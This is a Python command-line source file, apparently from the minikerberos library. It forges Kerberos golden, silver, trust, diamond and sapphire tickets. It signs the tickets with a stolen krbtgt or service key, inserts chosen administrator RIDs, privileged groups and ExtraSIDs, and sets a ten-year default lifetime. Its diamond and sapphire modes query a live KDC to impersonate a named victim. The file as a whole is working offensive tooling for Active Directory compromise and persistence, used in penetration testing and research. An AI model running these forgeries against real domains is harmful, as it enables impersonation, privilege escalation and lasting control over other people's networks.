import logging
import asyncio

from minikerberos import logger
from minikerberos.common.factory import KerberosClientFactory, kerberos_url_help_epilog
from minikerberos.common.spn import KerberosSPN
from minikerberos.ticketer import (
	golden_ticket, silver_ticket, trust_ticket, diamond_ticket, sapphire_ticket,
	key_from_hex, key_from_password, DEFAULT_DURATION_HOURS, DEFAULT_GOLDEN_GROUPS,
)
from minikerberos.protocol.encryption import Enctype


def _parse_key(args, what):
	"""Turn the -aes/-nthash/-password options into a Key for signing."""
	if args.aes is not None:
		raw = bytes.fromhex(args.aes)
		etype = Enctype.AES256 if len(raw) == 32 else Enctype.AES128
		return key_from_hex(args.aes, etype)
	if args.nthash is not None:
		return key_from_hex(args.nthash, Enctype.RC4)
	if args.password is not None:
		# A service/krbtgt long-term key derived from a password needs the
		# principal+realm salt, which only silver tickets reliably know.
		raise SystemExit('%s: pass -aes or -nthash; password derivation needs the account salt' % what)
	raise SystemExit('%s: one of -aes / -nthash is required' % what)


def _parse_groups(groups):
	if groups is None:
		return list(DEFAULT_GOLDEN_GROUPS)
	return [int(g.strip()) for g in groups.split(',') if g.strip()]


def _parse_sids(extra_sid):
	if extra_sid is None:
		return []
	return [s.strip() for s in extra_sid.split(',') if s.strip()]


def _save(ft, args):
	print(str(ft.to_kirbi()))
	print('[+] ' + ft.describe())
	if args.ccache is not None:
		ft.to_ccache().to_file(args.ccache)
		print('[+] Ticket stored in ccache file %s' % args.ccache)
	if args.kirbi is not None:
		ft.to_kirbi().to_file(args.kirbi)
		print('[+] Ticket stored in kirbi file %s' % args.kirbi)


async def amain(args):
	groups = _parse_groups(args.groups)
	extra_sids = _parse_sids(args.extra_sid)

	if args.command == 'golden':
		key = _parse_key(args, 'golden')
		ft = golden_ticket(
			args.user, args.domain, args.domain_sid, key,
			user_id = args.user_id, groups = groups, extra_sids = extra_sids,
			duration_hours = args.duration, extra_pac = args.extra_pac,
			old_pac = args.old_pac)
		_save(ft, args)

	elif args.command == 'silver':
		# A silver ticket's key is the service account's, so a password can be
		# salted here with spn-less principal + realm.
		if args.password is not None and args.aes is None and args.nthash is None:
			principal = args.spn.split('/')[0]
			key = key_from_password(args.password, principal, args.domain)
		else:
			key = _parse_key(args, 'silver')
		ft = silver_ticket(
			args.user, args.domain, args.domain_sid, args.spn, key,
			user_id = args.user_id, groups = groups, extra_sids = extra_sids,
			duration_hours = args.duration, extra_pac = args.extra_pac,
			old_pac = args.old_pac)
		_save(ft, args)

	elif args.command == 'trust':
		key = _parse_key(args, 'trust')
		ft = trust_ticket(
			args.user, args.domain, args.domain_sid, args.target_domain, key,
			user_id = args.user_id, groups = groups, extra_sids = extra_sids,
			duration_hours = args.duration, extra_pac = args.extra_pac,
			old_pac = args.old_pac)
		_save(ft, args)

	elif args.command == 'diamond':
		key = _parse_key(args, 'diamond')
		client = KerberosClientFactory.from_url(args.kerberos_url).get_client()
		ft = await diamond_ticket(
			client, key,
			domain_sid = args.domain_sid, user_id = args.user_id,
			groups = groups if args.domain_sid is not None else None,
			extra_sids = extra_sids, extra_pac = args.extra_pac,
			old_pac = args.old_pac)
		_save(ft, args)

	elif args.command == 'sapphire':
		key = _parse_key(args, 'sapphire')
		client = KerberosClientFactory.from_url(args.kerberos_url).get_client()
		victim = KerberosSPN.from_upn(args.impersonate)
		ft = await sapphire_ticket(client, key, victim, duration_hours = args.duration)
		_save(ft, args)


def _add_common(p, needs_sid = True):
	p.add_argument('user', help='username the forged ticket is for')
	p.add_argument('-domain', required=True, help='target domain FQDN (e.g. contoso.com)')
	if needs_sid:
		p.add_argument('-domain-sid', dest='domain_sid', required=True, help='domain SID (e.g. S-1-5-21-...)')
	else:
		p.add_argument('-domain-sid', dest='domain_sid', default=None, help='domain SID; rebuilds the PAC when given')
	p.add_argument('-aes', help='AES key (128/256-bit hex) to sign with')
	p.add_argument('-nthash', help='NT hash (RC4 key) to sign with')
	p.add_argument('-password', help='account password (silver only)')
	p.add_argument('-user-id', dest='user_id', type=int, default=500, help='RID of the user (default 500)')
	p.add_argument('-groups', default=None, help='comma-separated group RIDs (default %s)' % ','.join(map(str, DEFAULT_GOLDEN_GROUPS)))
	p.add_argument('-extra-sid', dest='extra_sid', default=None, help='comma-separated ExtraSIDs for the PAC')
	p.add_argument('-duration', type=int, default=DEFAULT_DURATION_HOURS, help='ticket lifetime in hours (default 10 years)')
	p.add_argument('-extra-pac', dest='extra_pac', action='store_true', default=True, help='include UPN_DNS_INFO (default on)')
	p.add_argument('-no-extra-pac', dest='extra_pac', action='store_false', help='omit UPN_DNS_INFO')
	p.add_argument('-old-pac', dest='old_pac', action='store_true', help='omit PAC_ATTRIBUTES_INFO + PAC_REQUESTOR (pre-2021 PAC)')
	p.add_argument('--ccache', help='write the ticket to this ccache file')
	p.add_argument('--kirbi', help='write the ticket to this kirbi file')


def main():
	import argparse
	parser = argparse.ArgumentParser(
		description='Forge Kerberos tickets (golden / silver / trust / diamond / sapphire)',
		formatter_class=argparse.RawDescriptionHelpFormatter,
		epilog=kerberos_url_help_epilog)
	parser.add_argument('-v', '--verbose', action='count', default=0)
	sub = parser.add_subparsers(dest='command', required=True)

	g = sub.add_parser('golden', help='forge a TGT with the krbtgt key (offline)')
	_add_common(g)

	s = sub.add_parser('silver', help='forge a service ticket with a service key (offline)')
	_add_common(s)
	s.add_argument('-spn', required=True, help='target SPN, e.g. cifs/host.domain.com')

	t = sub.add_parser('trust', help='forge an inter-realm referral TGT with a trust key (offline)')
	_add_common(t)
	t.add_argument('-target-domain', dest='target_domain', required=True, help='the trusted target realm')

	d = sub.add_parser('diamond', help='request a real TGT and re-PAC it with the krbtgt key')
	_add_common(d, needs_sid=False)
	d.add_argument('kerberos_url', help='kerberos target string for the valid account')

	sa = sub.add_parser('sapphire', help='forge a TGT carrying a real PAC lifted via S4U2self+U2U')
	sa.add_argument('-domain', required=True, help='target domain FQDN')
	sa.add_argument('-aes', help='krbtgt AES key (hex)')
	sa.add_argument('-nthash', help='krbtgt NT hash')
	sa.add_argument('-password', help=argparse.SUPPRESS)
	sa.add_argument('-impersonate', required=True, help='victim UPN to lift the PAC from')
	sa.add_argument('-duration', type=int, default=DEFAULT_DURATION_HOURS, help='ticket lifetime in hours')
	sa.add_argument('--ccache', help='write the ticket to this ccache file')
	sa.add_argument('--kirbi', help='write the ticket to this kirbi file')
	sa.add_argument('kerberos_url', help='kerberos target string for the valid account')

	args = parser.parse_args()

	if args.verbose == 0:
		logging.basicConfig(level=logging.INFO)
	elif args.verbose == 1:
		logging.basicConfig(level=logging.DEBUG)
	else:
		logging.basicConfig(level=1)
	logger.setLevel(max(logging.DEBUG, logging.WARNING - args.verbose * 10))

	asyncio.run(amain(args))


if __name__ == '__main__':
	main()
